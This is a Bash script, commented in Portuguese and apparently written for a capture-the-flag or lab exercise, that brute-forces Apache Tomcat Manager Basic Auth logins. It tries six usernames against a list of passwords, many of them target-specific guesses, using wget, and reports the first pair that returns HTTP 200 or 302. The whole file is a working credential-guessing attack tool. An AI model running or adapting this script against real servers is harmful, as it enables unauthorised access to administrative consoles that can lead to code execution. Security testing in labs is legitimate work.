#!/usr/bin/env bash
# Brute force focado para Tomcat Manager via Basic Auth (CTF/lab).
# Uso:
#   bash tomcat_manager_bruteforce.sh
#   bash tomcat_manager_bruteforce.sh --url http://127.0.0.1:8080/manager/html

set -euo pipefail

URL="http://127.0.0.1:8080/manager/html"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --url) URL="${2:-}"; shift 2 ;;
    -h|--help)
      echo "Uso: bash tomcat_manager_bruteforce.sh [--url http://127.0.0.1:8080/manager/html]"
      exit 0
      ;;
    *) echo "[!] Opcao invalida: $1" >&2; exit 1 ;;
  esac
done

if ! command -v wget >/dev/null 2>&1; then
  echo "[!] wget nao encontrado." >&2
  exit 1
fi

USERS=(tomcat admin manager root nickj nick-server)
PASSWORDS=(
  "424242"
  "crazycat"
  "ZeqlcR2!4gN"
  "nick3saturno8"
  "nick1terra0"
  "nick5mercurio#8"
  "nick4netuno7"
  "nick2venus2"
  "nick4terra\$7"
  "nick2terra1"
  "nick5jupiter-7"
  "nick0mercurio!5"
  "nick3saturno9"
  "nick1jupiter*2"
  "nick4venus7"
  "nick7marte!3"
  "nick6urano2"
  "nick5saturno5"
  "nick1netuno-0"
  "nick0marte0"
  "nick9jupiter-4"
  "nick3urano\$7"
  "nick7terra!7"
  "nick4jupiter-8"
  "nick2saturno!6"
  "nick4urano*4"
  "nick6netuno7"
  "nick1netuno\$2"
  "tomcat"
  "admin"
  "manager"
  "password"
)

echo "[*] URL: ${URL}"
echo "[*] Users: ${#USERS[@]}"
echo "[*] Passwords: ${#PASSWORDS[@]}"

attempt=0
for u in "${USERS[@]}"; do
  for p in "${PASSWORDS[@]}"; do
    attempt=$((attempt + 1))
    code="$(wget --server-response --user="${u}" --password="${p}" -O- "${URL}" 2>&1 | awk '/HTTP\//{c=$2} END{print c}')"
    printf '[%04d] %s:%s -> %s\n' "${attempt}" "${u}" "${p}" "${code:-NA}"
    if [[ "${code}" == "200" || "${code}" == "302" ]]; then
      echo "[+] HIT ${u}:${p} -> ${code}"
      exit 0
    fi
  done
done

echo "[-] Sem hit."
exit 1

